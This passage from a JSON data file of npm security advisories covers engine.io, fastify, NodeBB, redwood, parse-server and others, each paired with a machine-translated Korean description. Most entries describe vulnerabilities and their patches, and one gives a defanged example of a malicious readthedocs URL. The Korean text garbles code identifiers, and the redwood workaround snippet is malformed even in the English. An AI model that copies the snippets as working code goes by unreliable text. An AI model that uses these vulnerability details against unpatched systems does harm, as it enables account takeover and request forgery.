| `~6.0.0`            | Please upgrade to `socket.io@4.5.x`                                                                    |\n| `socket.io@4.2.x`           | `~5.2.0`            | Please upgrade to `socket.io@4.5.x`                                                                    |\n| `socket.io@4.1.x`           | `~5.1.1`            | Please upgrade to `socket.io@4.5.x`                                                                    |\n| `socket.io@4.0.x`           | `~5.0.0`            | Please upgrade to `socket.io@4.5.x`                                                                    |\n| `socket.io@3.1.x`           | `~4.1.0`            | Please upgrade to `socket.io@4.5.x` (see [here](https://socket.io/docs/v4/migrating-from-3-x-to-4-0/)) |\n| `socket.io@3.0.x`           | `~4.0.0`            | Please upgrade to `socket.io@4.5.x` (see [here](https://socket.io/docs/v4/migrating-from-3-x-to-4-0/)) |\n| `socket.io@2.5.0`           | `~3.6.0`            | `npm audit fix` should be sufficient                                                                   |\n| `socket.io@2.4.x` and below | `~3.5.0`            | Please upgrade to `socket.io@2.5.0`                                                                    |\n\n### Workarounds\n\nThere is no known workaround except upgrading to a safe version.\n\n### For more information\n\nIf you have any questions or comments about this advisory:\n\n* Open an issue in [`engine.io`](https://github.com/socketio/engine.io)\n\nThanks to [Jonathan Neve](https://github.com/jonathanneve) for the responsible disclosure.\n",
    "identifiers": "GHSA : GHSA-r7qp-cfhv-p84w\nCVE : CVE-2022-41940",
    "severity": "MODERATE",
    "updatedAt": "2023-02-01T05:03:21Z",
    "publishedAt": "2022-11-21T23:55:41Z",
    "references": "https://github.com/socketio/engine.io/security/advisories/GHSA-r7qp-cfhv-p84w\nhttps://nvd.nist.gov/vuln/detail/CVE-2022-41940\nhttps://github.com/socketio/engine.io/commit/425e833ab13373edf1dd5a0706f07100db14e3c6\nhttps://github.com/socketio/engine.io/commit/83c4071af871fc188298d7d591e95670bf9f9085\nhttps://github.com/advisories/GHSA-r7qp-cfhv-p84w",
    "name": "engine.io",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 3.6.1",
    "identifier": "3.6.1",
    "descriptionKR": "### 영향\n\n특별히 제작된 HTTP 요청은 Engine.IO 서버에서 포착되지 않은 예외를 트리거하여 Node.js 프로세스를 중단시킬 수 있습니다.\n\n```\nevents.js:292\n      던져 어; // 처리되지 않은 '오류' 이벤트\n      ^^\n\n오류: ECONNRESET 읽기\n    TCP.onStreamRead(internal/stream_base_commons.js:209:20)에서\n소켓 인스턴스에서 발생한 '오류' 이벤트:\n    emitErrorNT(internal/streams/destroy.js:106:8)에서\n    emitErrorCloseNT에서(internal/streams/destroy.js:74:3)\n    processTicksAndRejections에서(내부/프로세스/task_queues.js:80:21) {\n  오류 번호: -104,\n  코드: 'ECONNRESET',\n  시스템 호출: '읽기'\n}\n```\n\n이는 [`socket.io`](https: //www.npmjs.com/package/socket.io).\n\n### 패치\n\n수정 사항이 오늘(2022/11/20) 릴리스되었습니다.\n\n| 버전 범위 | 고정 버전 |\n|----|---------------|\n| `engine.io@3.x.y` | `3.6.1` |\n| `engine.io@6.x.y` | `6.2.1` |\n\n`socket.io` 사용자의 경우:\n\n| 버전 범위 | `engine.io` 버전 | 사소한 업데이트가 필요하십니까? |\n|--------------------------------------------|---- --|----------------------------------------------- -------------------------------------------------- -------|\n| `socket.io@4.5.x` | `~6.2.0` | `npm 감사 수정`으로 충분해야 합니다 |\n| `socket.io@4.4.x` | `~6.1.0` | `socket.io@4.5.x`로 업그레이드하십시오 |\n| `socket.io@4.3.x` | `~6.0.0` | `socket.io@4.5.x`로 업그레이드하십시오 |\n| `socket.io@4.2.x` | `~5.2.0` | `socket.io@4.5.x`로 업그레이드하십시오 |\n| `socket.io@4.1.x` | `~5.1.1` | `socket.io@4.5.x`로 업그레이드하십시오 |\n| `socket.io@4.0.x` | `~5.0.0` | `socket.io@4.5.x`로 업그레이드하십시오 |\n| `socket.io@3.1.x` | `~4.1.0` | `socket.io@4.5.x`로 업그레이드하십시오([여기](https://socket.io/docs/v4/migrating-from-3-x-to-4-0/) 참조) |\n| `socket.io@3.0.x` | `~4.0.0` | `socket.io@4.5.x`로 업그레이드하십시오([여기](https://socket.io/docs/v4/migrating-from-3-x-to-4-0/) 참조) |\n| `socket.io@2.5.0` | `~3.6.0` | `npm 감사 수정`으로 충분해야 합니다 |\n| `socket.io@2.4.x` 이하 | `~3.5.0` | `socket.io@2.5.0`으로 업그레이드하십시오 |\n\n### 해결 방법\n\n안전한 버전으로 업그레이드하는 것 외에는 알려진 해결 방법이 없습니다.\n\n### 자세한 내용은\n\n이 권고에 대한 질문이나 의견이 있는 경우:\n\n* [`engine.io`](https://github.com/socketio/engine.io)에서 이슈 열기\n\n책임 있는 공개에 대해 [Jonathan Neve](https://github.com/jonathanneve)에게 감사드립니다."
  },
  {
    "description": "### Impact\n\nThe attacker can use the incorrect `Content-Type` to bypass the `Pre-Flight` checking of `fetch`. `fetch()` requests with Content-Type’s [essence](https://mimesniff.spec.whatwg.org/#mime-type-essence) as \"application/x-www-form-urlencoded\", \"multipart/form-data\", or \"text/plain\", could potentially be used to invoke routes that only accepts `application/json` content type, thus bypassing any [CORS protection](https://fetch.spec.whatwg.org/#simple-header), and therefore they could lead to a  Cross-Site Request Forgery attack.\n\n### Patches\nFor `4.x` users, please update to at least `4.10.2`\nFor `3.x` users, please update to at least `3.29.4`\n\n### Workarounds\n\nImplement Cross-Site Request Forgery protection using [`@fastify/csrf`](https://www.npmjs.com/package/@fastify/csrf).\n\n### References\n\nCheck out the HackerOne report: https://hackerone.com/reports/1763832.\n\n### For more information\n\n[Fastify security policy](https://github.com/fastify/fastify/security/policy)\n",
    "identifiers": "GHSA : GHSA-3fjj-p79j-c9hh\nCVE : CVE-2022-41919",
    "severity": "MODERATE",
    "updatedAt": "2023-01-31T05:07:11Z",
    "publishedAt": "2022-11-21T22:28:11Z",
    "references": "https://github.com/fastify/fastify/security/advisories/GHSA-3fjj-p79j-c9hh\nhttps://github.com/fastify/fastify/commit/62dde76f1f7aca76e38625fe8d983761f26e6fc9\nhttps://nvd.nist.gov/vuln/detail/CVE-2022-41919\nhttps://www.npmjs.com/package/@fastify/csrf\nhttps://github.com/advisories/GHSA-3fjj-p79j-c9hh",
    "name": "fastify",
    "ecosystem": "NPM",
    "vulnerableVersionRange": ">= 3.0.0, < 3.29.4",
    "identifier": "3.29.4",
    "descriptionKR": "### 영향\n\n공격자는 잘못된 'Content-Type'을 사용하여 'fetch'의 'Pre-Flight' 검사를 우회할 수 있습니다. Content-Type의 [essence](https://mimesniff.spec.whatwg.org/#mime-type-essence)가 \"application/x-www-form-urlencoded\", \"multipart/form\"인 `fetch()` 요청 -data\" 또는 \"text/plain\"은 잠재적으로 `application/json` 콘텐츠 유형만 허용하는 경로를 호출하여 [CORS 보호](https://fetch.spec.whatwg.org/# simple-header), 따라서 Cross-Site Request Forgery 공격으로 이어질 수 있습니다.\n\n### 패치\n`4.x` 사용자의 경우 `4.10.2` 이상으로 업데이트하십시오.\n`3.x` 사용자의 경우 `3.29.4` 이상으로 업데이트하십시오.\n\n### 해결 방법\n\n[`@fastify/csrf`](https://www.npmjs.com/package/@fastify/csrf)를 사용하여 사이트 간 요청 위조 방지를 구현합니다.\n\n### 참조\n\nHackerOne 보고서를 확인하세요: https://hackerone.com/reports/1763832.\n\n### 자세한 내용은\n\n[Fastify 보안 정책](https://github.com/fastify/fastify/security/policy)"
  },
  {
    "description": "### Impact\n\nThe attacker can use the incorrect `Content-Type` to bypass the `Pre-Flight` checking of `fetch`. `fetch()` requests with Content-Type’s [essence](https://mimesniff.spec.whatwg.org/#mime-type-essence) as \"application/x-www-form-urlencoded\", \"multipart/form-data\", or \"text/plain\", could potentially be used to invoke routes that only accepts `application/json` content type, thus bypassing any [CORS protection](https://fetch.spec.whatwg.org/#simple-header), and therefore they could lead to a  Cross-Site Request Forgery attack.\n\n### Patches\nFor `4.x` users, please update to at least `4.10.2`\nFor `3.x` users, please update to at least `3.29.4`\n\n### Workarounds\n\nImplement Cross-Site Request Forgery protection using [`@fastify/csrf`](https://www.npmjs.com/package/@fastify/csrf).\n\n### References\n\nCheck out the HackerOne report: https://hackerone.com/reports/1763832.\n\n### For more information\n\n[Fastify security policy](https://github.com/fastify/fastify/security/policy)\n",
    "identifiers": "GHSA : GHSA-3fjj-p79j-c9hh\nCVE : CVE-2022-41919",
    "severity": "MODERATE",
    "updatedAt": "2023-01-31T05:07:11Z",
    "publishedAt": "2022-11-21T22:28:11Z",
    "references": "https://github.com/fastify/fastify/security/advisories/GHSA-3fjj-p79j-c9hh\nhttps://github.com/fastify/fastify/commit/62dde76f1f7aca76e38625fe8d983761f26e6fc9\nhttps://nvd.nist.gov/vuln/detail/CVE-2022-41919\nhttps://www.npmjs.com/package/@fastify/csrf\nhttps://github.com/advisories/GHSA-3fjj-p79j-c9hh",
    "name": "fastify",
    "ecosystem": "NPM",
    "vulnerableVersionRange": ">= 4.0.0, < 4.10.2",
    "identifier": "4.10.2",
    "descriptionKR": "### 영향\n\n공격자는 잘못된 'Content-Type'을 사용하여 'fetch'의 'Pre-Flight' 검사를 우회할 수 있습니다. Content-Type의 [essence](https://mimesniff.spec.whatwg.org/#mime-type-essence)가 \"application/x-www-form-urlencoded\", \"multipart/form\"인 `fetch()` 요청 -data\" 또는 \"text/plain\"은 잠재적으로 `application/json` 콘텐츠 유형만 허용하는 경로를 호출하여 [CORS 보호](https://fetch.spec.whatwg.org/# simple-header), 따라서 Cross-Site Request Forgery 공격으로 이어질 수 있습니다.\n\n### 패치\n`4.x` 사용자의 경우 `4.10.2` 이상으로 업데이트하십시오.\n`3.x` 사용자의 경우 `3.29.4` 이상으로 업데이트하십시오.\n\n### 해결 방법\n\n[`@fastify/csrf`](https://www.npmjs.com/package/@fastify/csrf)를 사용하여 사이트 간 요청 위조 방지를 구현합니다.\n\n### 참조\n\nHackerOne 보고서를 확인하세요: https://hackerone.com/reports/1763832.\n\n### 자세한 내용은\n\n[Fastify 보안 정책](https://github.com/fastify/fastify/security/policy)"
  },
  {
    "description": "deep-object-diff before version 1.1.6 allows an external attacker to edit or add new properties to an object. This is possible because the application does not properly validate incoming JSON keys, thus allowing the `__proto__` property to be edited. This issue was fixed in version 1.1.9.",
    "identifiers": "GHSA : GHSA-653v-rqx9-j85p\nCVE : CVE-2022-41713",
    "severity": "MODERATE",
    "updatedAt": "2023-01-28T05:03:20Z",
    "publishedAt": "2022-11-04T12:00:25Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2022-41713\nhttps://fluidattacks.com/advisories/heldens/\nhttps://github.com/mattphillips/deep-object-diff/issues/85\nhttps://github.com/mattphillips/deep-object-diff/issues/85#issuecomment-1312450353\nhttps://github.com/mattphillips/deep-object-diff/pull/87/commits/55f9c3c70cf0d54cb30291e949fb8682fa3c5d9f\nhttps://github.com/mattphillips/deep-object-diff/pull/87/commits/9576963b68b955e88610aa4f0c696a1aafc1119d\nhttps://github.com/advisories/GHSA-653v-rqx9-j85p",
    "name": "deep-object-diff",
    "ecosystem": "NPM",
    "vulnerableVersionRange": ">= 1.1.6, < 1.1.9",
    "identifier": "1.1.9",
    "descriptionKR": "버전 1.1.6 이전의 deep-object-diff에서는 외부 공격자가 개체에 새 속성을 편집하거나 추가할 수 있습니다. 이는 애플리케이션이 들어오는 JSON 키의 유효성을 제대로 검사하지 않아 `__proto__` 속성을 편집할 수 있기 때문에 가능합니다. 이 문제는 버전 1.1.9에서 수정되었습니다."
  },
  {
    "description": "A vulnerability was found in NodeBB up to 2.5.7. This affects an unknown part of the file /register/abort. The manipulation leads to cross-site request forgery. It is possible to initiate the attack remotely. Upgrading to version 2.5.8 is able to address this issue. The name of the patch is 2f9d8c350e54543f608d3d4c8e1a49bbb6cdea38. It is recommended to upgrade the affected component.",
    "identifiers": "GHSA : GHSA-5gwx-wf9g-r5mx\nCVE : CVE-2022-3978",
    "severity": "MODERATE",
    "updatedAt": "2023-01-29T05:02:40Z",
    "publishedAt": "2022-11-13T19:00:41Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2022-3978\nhttps://github.com/NodeBB/NodeBB/issues/11017\nhttps://github.com/NodeBB/NodeBB/commit/2f9d8c350e54543f608d3d4c8e1a49bbb6cdea38\nhttps://github.com/NodeBB/NodeBB/releases/tag/v2.5.8\nhttps://vuldb.com/?id.213555\nhttps://github.com/advisories/GHSA-5gwx-wf9g-r5mx",
    "name": "nodebb",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 2.5.8",
    "identifier": "2.5.8",
    "descriptionKR": "NodeBB 2.5.7까지 취약점이 발견되었습니다. 이는 /register/abort 파일의 알 수 없는 부분에 영향을 줍니다. 조작은 사이트 간 요청 위조로 이어집니다. 공격을 원격으로 시작할 수 있습니다. 버전 2.5.8로 업그레이드하면 이 문제를 해결할 수 있습니다. 패치의 이름은 2f9d8c350e54543f608d3d4c8e1a49bbb6cdea38입니다. 영향을 받는 구성 요소를 업그레이드하는 것이 좋습니다."
  },
  {
    "description": "A vulnerability was found in matrix-appservice-irc up to 0.35.1. This vulnerability affects the file src/datastore/postgres/PgDataStore.ts. The manipulation of the argument roomIds leads to sql injection. Upgrading to version 0.36.0 is able to address this issue. The name of the patch is 179313a37f06b298150edba3e2b0e5a73c1415e7. It is recommended to upgrade the affected component. ",
    "identifiers": "GHSA : GHSA-ffwf-47x2-jpr8\nCVE : CVE-2022-3971",
    "severity": "MODERATE",
    "updatedAt": "2023-01-28T05:03:18Z",
    "publishedAt": "2022-11-13T12:00:17Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2022-3971\nhttps://github.com/matrix-org/matrix-appservice-irc/pull/1619\nhttps://github.com/matrix-org/matrix-appservice-irc/commit/179313a37f06b298150edba3e2b0e5a73c1415e7\nhttps://github.com/matrix-org/matrix-appservice-irc/releases/tag/0.36.0\nhttps://vuldb.com/?id.213550\nhttps://github.com/advisories/GHSA-ffwf-47x2-jpr8",
    "name": "matrix-appservice-irc",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 0.36.0",
    "identifier": "0.36.0",
    "descriptionKR": "matrix-appservice-irc 0.35.1까지 취약점이 발견되었습니다. 이 취약점은 src/datastore/postgres/PgDataStore.ts 파일에 영향을 미칩니다. roomIds 인수를 조작하면 SQL 주입이 발생합니다. 버전 0.36.0으로 업그레이드하면 이 문제를 해결할 수 있습니다. 패치 이름은 179313a37f06b298150edba3e2b0e5a73c1415e7입니다. 영향을 받는 구성 요소를 업그레이드하는 것이 좋습니다."
  },
  {
    "description": "### Impact\n\nThis vulnerability allowed a malicious user to serve arbitrary HTML files from the main application domain (readthedocs[.]org/readthedocs[.]com) by exploiting a vulnerability in the code that serves downloadable content from a project. \n\nExploiting this would have required the attacker to get a logged-in user to visit the malicious URL, which would have allowed the attacker to take control of the user's session with JavaScript (making requests to the API/site on behalf of the user). This URL would have looked something like `hxxps[:]//readthedocs[.]org/projects/attacker-project/downloads/html/version-with-javascript-attack/`.\n\n### Patches\n\nThis issue has been patched in our 8.8.1 release.",
    "identifiers": "GHSA : GHSA-98pf-gfh3-x3mp",
    "severity": "MODERATE",
    "updatedAt": "2023-01-07T05:06:04Z",
    "publishedAt": "2022-11-10T16:02:51Z",
    "references": "https://github.com/readthedocs/readthedocs.org/security/advisories/GHSA-98pf-gfh3-x3mp\nhttps://github.com/readthedocs/readthedocs.org/commit/b0ae626acd13882170ec5888e35f3ef2e48e6ff6\nhttps://github.com/advisories/GHSA-98pf-gfh3-x3mp",
    "name": "readthedocs",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 8.8.1",
    "identifier": "8.8.1",
    "descriptionKR": "### 영향\n\n이 취약점으로 인해 악의적인 사용자는 프로젝트에서 다운로드 가능한 콘텐츠를 제공하는 코드의 취약점을 악용하여 주 응용 프로그램 도메인(readthedocs[.]org/readthedocs[.]com)에서 임의의 HTML 파일을 제공할 수 있습니다.\n\n이를 악용하려면 공격자가 로그인한 사용자가 악의적인 URL을 방문하도록 해야 했으며, 이를 통해 공격자는 JavaScript를 사용하여 사용자 세션을 제어할 수 있었습니다(사용자를 대신하여 API/사이트에 요청 생성). 이 URL은 `hxxps[:]//readthedocs[.]org/projects/attacker-project/downloads/html/version-with-javascript-attack/`과 같이 생겼을 것입니다.\n\n### 패치\n\n이 문제는 8.8.1 릴리스에서 패치되었습니다."
  },
  {
    "description": "# Impact\n\n_What kind of vulnerability is it? Who is impacted?_\n\nThis is an API vulnerability in Redwood's [dbAuth], specifically the dbAuth forgot password feature:\n- only projects with the dbAuth \"forgot password\" feature are affected\n- this vulnerability was introduced in v0.38.0\n\n## User Accounts are Vulnerable to Takeover (Hijacking)\n\nA reset token for any user can be obtained given knowledge of their username or email via the forgot-password API. With the leaked reset token, a malicious user could request to reset a user's password, changing their credentials and gaining access to their account.\n\n## How to Determine if Projects have been Attacked\n\nTo determine if a project has been attacked, we recommend checking logs for suspicious activity; namely, the volume of requests to the forgot-password API using emails that don't exist. Another indication is if users inform you that they can't access their accounts.\n\nIf you have question or concerns, reach out via the \"For More Information\" section below.\n\n# Patch Releases Available\n\n**The problem has been patched on the v3 and v2 release lines.** Users should upgrade to **v3.3.1+**  or **v2.2.5+** respectively.\n\n## Workarounds\n\n_Is there a way for users to fix or remediate the vulnerability without upgrading?_\n\nWe recommend upgrading to the Patch Releases above. If upgrading is not possible, there are several workarounds:\n\n### Manually strip out `resetToken` and `resetTokenExpiresAt` in the `forgotPassword.handler()`\n\nUsers on all release lines can have their `forgotPassword.handler()` function strip out the sensitive fields manually before returning\n\n```js\nhandler: (user) => {\n  // your code to notify/email user of the link to reset their password...\n\n  const = { resetToken, resetTokenExpiresAt, ...rest }\n\n  return rest\n}\n```\n\n### Use `yarn patch` to manually apply the fix\n\nUsers on v3 and v2 can use [`yarn patch`] to apply the fix if they're using yarn v3. See the dbAuth \"forgot-password\" Account Takeover Vulnerability high gist for instructions. \n\n### Disable the forgot password flow entirely v3 only\n\nUsers on v3 can disable the forgot password flow entirely.",
    "identifiers": "GHSA : GHSA-3qmc-2r76-4rqp",
    "severity": "HIGH",
    "updatedAt": "2023-01-07T05:06:22Z",
    "publishedAt": "2022-11-10T15:51:01Z",
    "references": "https://github.com/redwoodjs/redwood/security/advisories/GHSA-3qmc-2r76-4rqp\nhttps://github.com/redwoodjs/redwood/issues/6343\nhttps://github.com/redwoodjs/redwood/pull/6778\nhttps://github.com/redwoodjs/redwood/releases/tag/v2.2.5\nhttps://github.com/redwoodjs/redwood/releases/tag/v3.3.1\nhttps://github.com/advisories/GHSA-3qmc-2r76-4rqp",
    "name": "@redwoodjs/api",
    "ecosystem": "NPM",
    "vulnerableVersionRange": ">= 3.0.0, < 3.3.1",
    "identifier": "3.3.1",
    "descriptionKR": "# 영향\n\n_어떤 종류의 취약점입니까? 누가 영향을 받습니까?_\n\n이는 Redwood의 [dbAuth], 특히 dbAuth 암호 분실 기능의 API 취약점입니다.\n- dbAuth \"비밀번호 분실\" 기능이 있는 프로젝트만 영향을 받습니다.\n- 이 취약점은 v0.38.0에서 도입되었습니다.\n\n## 사용자 계정은 탈취(하이재킹)에 취약합니다.\n\n모든 사용자의 재설정 토큰은 비밀번호 찾기 API를 통해 사용자 이름 또는 이메일을 알면 얻을 수 있습니다. 유출된 재설정 토큰으로 악의적인 사용자는 사용자의 암호 재설정을 요청하여 자격 증명을 변경하고 계정에 대한 액세스 권한을 얻을 수 있습니다.\n\n## 프로젝트가 공격을 받았는지 확인하는 방법\n\n프로젝트가 공격을 받았는지 확인하려면 의심스러운 활동이 있는지 로그를 확인하는 것이 좋습니다. 즉, 존재하지 않는 이메일을 사용하여 암호 찾기 API에 대한 요청의 양입니다. 또 다른 징후는 사용자가 자신의 계정에 액세스할 수 없다고 알리는 경우입니다.\n\n질문이나 우려 사항이 있는 경우 아래의 \"자세한 정보\" 섹션을 통해 문의하십시오.\n\n# 패치 릴리스 사용 가능\n\n**이 문제는 v3 및 v2 릴리스 라인에서 패치되었습니다.** 사용자는 각각 **v3.3.1+** 또는 **v2.2.5+**로 업그레이드해야 합니다.\n\n## 해결 방법\n\n_사용자가 업그레이드하지 않고 취약점을 수정하거나 치료할 수 있는 방법이 있습니까?_\n\n위의 패치 릴리스로 업그레이드하는 것이 좋습니다. 업그레이드가 불가능한 경우 몇 가지 해결 방법이 있습니다.\n\n### `forgotPassword.handler()`에서 `resetToken` 및 `resetTokenExpiresAt`를 수동으로 제거합니다.\n\n모든 릴리스 라인의 사용자는 `forgotPassword.handler()` 함수를 사용하여 반환하기 전에 민감한 필드를 수동으로 제거할 수 있습니다.\n\n```js\n핸들러: (사용자) => {\n  // 사용자에게 비밀번호 재설정 링크를 알리거나 이메일로 보내는 코드...\n\n  const = { resetToken, resetTokenExpiresAt, ...rest }\n\n  휴식을 반환\n}\n```\n\n### 수정 사항을 수동으로 적용하려면 `yarn patch`를 사용하세요.\n\nv3 및 v2 사용자는 [`yarn patch`]를 사용하여 Yarn v3을 사용하는 경우 수정 사항을 적용할 수 있습니다. 지침은 dbAuth \"forgot-password\" Account Takeover Vulnerability high gist를 참조하십시오.\n\n### 비밀번호 분실 흐름을 완전히 비활성화 v3 전용\n\nv3 사용자는 비밀번호 분실 흐름을 완전히 비활성화할 수 있습니다."
  },
  {
    "description": "# Impact\n\n_What kind of vulnerability is it? Who is impacted?_\n\nThis is an API vulnerability in Redwood's [dbAuth], specifically the dbAuth forgot password feature:\n- only projects with the dbAuth \"forgot password\" feature are affected\n- this vulnerability was introduced in v0.38.0\n\n## User Accounts are Vulnerable to Takeover (Hijacking)\n\nA reset token for any user can be obtained given knowledge of their username or email via the forgot-password API. With the leaked reset token, a malicious user could request to reset a user's password, changing their credentials and gaining access to their account.\n\n## How to Determine if Projects have been Attacked\n\nTo determine if a project has been attacked, we recommend checking logs for suspicious activity; namely, the volume of requests to the forgot-password API using emails that don't exist. Another indication is if users inform you that they can't access their accounts.\n\nIf you have question or concerns, reach out via the \"For More Information\" section below.\n\n# Patch Releases Available\n\n**The problem has been patched on the v3 and v2 release lines.** Users should upgrade to **v3.3.1+**  or **v2.2.5+** respectively.\n\n## Workarounds\n\n_Is there a way for users to fix or remediate the vulnerability without upgrading?_\n\nWe recommend upgrading to the Patch Releases above. If upgrading is not possible, there are several workarounds:\n\n### Manually strip out `resetToken` and `resetTokenExpiresAt` in the `forgotPassword.handler()`\n\nUsers on all release lines can have their `forgotPassword.handler()` function strip out the sensitive fields manually before returning\n\n```js\nhandler: (user) => {\n  // your code to notify/email user of the link to reset their password...\n\n  const = { resetToken, resetTokenExpiresAt, ...rest }\n\n  return rest\n}\n```\n\n### Use `yarn patch` to manually apply the fix\n\nUsers on v3 and v2 can use [`yarn patch`] to apply the fix if they're using yarn v3. See the dbAuth \"forgot-password\" Account Takeover Vulnerability high gist for instructions. \n\n### Disable the forgot password flow entirely v3 only\n\nUsers on v3 can disable the forgot password flow entirely.",
    "identifiers": "GHSA : GHSA-3qmc-2r76-4rqp",
    "severity": "HIGH",
    "updatedAt": "2023-01-07T05:06:22Z",
    "publishedAt": "2022-11-10T15:51:01Z",
    "references": "https://github.com/redwoodjs/redwood/security/advisories/GHSA-3qmc-2r76-4rqp\nhttps://github.com/redwoodjs/redwood/issues/6343\nhttps://github.com/redwoodjs/redwood/pull/6778\nhttps://github.com/redwoodjs/redwood/releases/tag/v2.2.5\nhttps://github.com/redwoodjs/redwood/releases/tag/v3.3.1\nhttps://github.com/advisories/GHSA-3qmc-2r76-4rqp",
    "name": "@redwoodjs/api",
    "ecosystem": "NPM",
    "vulnerableVersionRange": ">= 0.38.0, < 2.2.5",
    "identifier": "2.2.5",
    "descriptionKR": "# 영향\n\n_어떤 종류의 취약점입니까? 누가 영향을 받습니까?_\n\n이는 Redwood의 [dbAuth], 특히 dbAuth 암호 분실 기능의 API 취약점입니다.\n- dbAuth \"비밀번호 분실\" 기능이 있는 프로젝트만 영향을 받습니다.\n- 이 취약점은 v0.38.0에서 도입되었습니다.\n\n## 사용자 계정은 탈취(하이재킹)에 취약합니다.\n\n모든 사용자의 재설정 토큰은 비밀번호 찾기 API를 통해 사용자 이름 또는 이메일을 알면 얻을 수 있습니다. 유출된 재설정 토큰으로 악의적인 사용자는 사용자의 암호 재설정을 요청하여 자격 증명을 변경하고 계정에 대한 액세스 권한을 얻을 수 있습니다.\n\n## 프로젝트가 공격을 받았는지 확인하는 방법\n\n프로젝트가 공격을 받았는지 확인하려면 의심스러운 활동이 있는지 로그를 확인하는 것이 좋습니다. 즉, 존재하지 않는 이메일을 사용하여 암호 찾기 API에 대한 요청의 양입니다. 또 다른 징후는 사용자가 자신의 계정에 액세스할 수 없다고 알리는 경우입니다.\n\n질문이나 우려 사항이 있는 경우 아래의 \"자세한 정보\" 섹션을 통해 문의하십시오.\n\n# 패치 릴리스 사용 가능\n\n**이 문제는 v3 및 v2 릴리스 라인에서 패치되었습니다.** 사용자는 각각 **v3.3.1+** 또는 **v2.2.5+**로 업그레이드해야 합니다.\n\n## 해결 방법\n\n_사용자가 업그레이드하지 않고 취약점을 수정하거나 치료할 수 있는 방법이 있습니까?_\n\n위의 패치 릴리스로 업그레이드하는 것이 좋습니다. 업그레이드가 불가능한 경우 몇 가지 해결 방법이 있습니다.\n\n### `forgotPassword.handler()`에서 `resetToken` 및 `resetTokenExpiresAt`를 수동으로 제거합니다.\n\n모든 릴리스 라인의 사용자는 `forgotPassword.handler()` 함수를 사용하여 반환하기 전에 민감한 필드를 수동으로 제거할 수 있습니다.\n\n```js\n핸들러: (사용자) => {\n  // 사용자에게 비밀번호 재설정 링크를 알리거나 이메일로 보내는 코드...\n\n  const = { resetToken, resetTokenExpiresAt, ...rest }\n\n  휴식을 반환\n}\n```\n\n### 수정 사항을 수동으로 적용하려면 `yarn patch`를 사용하세요.\n\nv3 및 v2 사용자는 [`yarn patch`]를 사용하여 Yarn v3을 사용하는 경우 수정 사항을 적용할 수 있습니다. 지침은 dbAuth \"forgot-password\" Account Takeover Vulnerability high gist를 참조하십시오.\n\n### 비밀번호 분실 흐름을 완전히 비활성화 v3 전용\n\nv3 사용자는 비밀번호 분실 흐름을 완전히 비활성화할 수 있습니다."
  },
  {
    "description": "### Impact\n\nA compromised Parse Server Cloud Code Webhook target endpoint allows an attacker to use prototype pollution to bypass the Parse Server `requestKeywordDenylist` option.\n\n### Patches\n\nImproved keyword detection.\n\n### Workarounds\n\nNone.\n\n### Collaborators\n\nMikhail Shcherbakov, Cristian-Alexandru Staicu and Musard Balliu working with Trend Micro Zero Day Initiative\n",
    "identifiers": "GHSA : GHSA-93vw-8fm5-p2jf\nCVE : CVE-2022-41879",
    "severity": "HIGH",
    "updatedAt": "2023-01-31T05:08:12Z",
    "publishedAt": "2022-11-10T13:02:35Z",
    "references": "https://github.com/parse-community/parse-server/security/advisories/GHSA-93vw-8fm5-p2jf\nhttps://github.com/parse-community/parse-server/pull/8305\nhttps://github.com/parse-community/parse-server/pull/8306\nhttps://github.com/parse-community/parse-server/commit/60c5a73d257e0d536056b38bdafef8b7130524d8\nhttps://github.com/parse-community/parse-server/commit/6c63f04ba37174021082a5b5c4ba1556dcc954f4\nhttps://github.com/parse-community/parse-server/releases/tag/4.10.20\nhttps://github.com/parse-community/parse-server/releases/tag/5.3.3\nhttps://nvd.nist.gov/vuln/detail/CVE-2022-41879\nhttps://github.com/advisories/GHSA-93vw-8fm5-p2jf",
    "name": "parse-server",
    "ecosystem": "NPM",
    "vulnerableVersionRange": ">= 5.0.0, < 5.3.3",
    "identifier": "5.3.3",
    "descriptionKR": "### 영향\n\n손상된 Parse Server Cloud Code Webhook 대상 엔드포인트를 통해 공격자는 프로토타입 오염을 사용하여 Parse Server 'requestKeywordDenylist' 옵션을 우회할 수 있습니다.\n\n### 패치\n\n향상된 키워드 감지.\n\n### 해결 방법\n\n없음.\n\n### 협력자\n\nTrend Micro Zero Day Initiative에서 일하는 Mikhail Shcherbakov, Cristian-Alexandru Staicu 및 Musard Balliu"
  },
  {
    "description": "### Impact\n\nA compromised Parse Server Cloud Code Webhook target endpoint allows an attacker to use prototype pollution to bypass the Parse Server `requestKeywordDenylist` option.\n\n### Patches\n\nImproved keyword detection.\n\n### Workarounds\n\nNone.\n\n### Collaborators\n\nMikhail Shcherbakov, Cristian-Alexandru Staicu and Musard Balliu working with Trend Micro Zero Day Initiative\n",
    "identifiers": "GHSA : GHSA-93vw-8fm5-p2jf\nCVE : CVE-2022-41879",
    "severity": "HIGH",
    "updatedAt": "2023-01-31T05:08:12Z",
    "publishedAt": "2022-11-10T13:02:35Z",
    "references": "https://github.com/parse-community/parse-server/security/advisories/GHSA-93vw-8fm5-p2jf\nhttps://github.com/parse-community/parse-server/pull/8305\nhttps://github.com/parse-community/parse-server/pull/8306\nhttps://github.com/parse-community/parse-server/commit/60c5a73d257e0d536056b38bdafef8b7130524d8\nhttps://github.com/parse-community/parse-server/commit/6c63f04ba37174021082a5b5c4ba1556dcc954f4\nhttps://github.com/parse-community/parse-server/releases/tag/4.10.20\nhttps://github.com/parse-community/parse-server/releases/tag/5.3.3\nhttps://nvd.nist.gov/vuln/detail/CVE-2022-41879\nhttps://github.com/advisories/GHSA-93vw-8fm5-p2jf",
    "name": "parse-server",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 4.10.20",
    "identifier": "4.10.20",
    "descriptionKR": "### 영향\n\n손상된 Parse Server Cloud Code Webhook 대상 엔드포인트를 통해 공격자는 프로토타입 오염을 사용하여 Parse Server 'requestKeywordDenylist' 옵션을 우회할 수 있습니다.\n\n### 패치\n\n향상된 키워드 감지.\n\n### 해결 방법\n\n없음.\n\n### 협력자\n\nTrend Micro Zero Day Initiative에서 일하는 Mikhail Shcherbakov, Cristian-Alexandru Staicu 및 Musard Balliu"
  },
  {
